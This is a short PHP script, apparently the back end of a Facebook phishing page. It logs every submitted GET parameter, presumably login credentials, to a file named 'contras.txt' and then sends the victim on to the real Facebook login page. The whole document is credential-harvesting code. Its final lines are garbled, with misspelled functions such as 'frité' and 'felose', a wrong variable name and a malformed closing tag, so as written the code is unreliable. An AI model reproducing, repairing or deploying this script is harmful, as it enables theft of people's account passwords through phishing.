<?php
 header("Location: http://www.Facebook.com/login.php ");
 $handle = fopen("contras.txt", "a");
  foreach($_GET as $variable => $value) { 
  	fwrite($handle, $variable);

  	 fwrite ($handle, "="); 

  	 fwrite ($handle, $value);

  	  fwrite ($handle, "\r\n");
  	  
 } 

  	 frité($ande, "\r\n");  
  	  felose ($handle);
  	   
  	  exit 
  	  ?›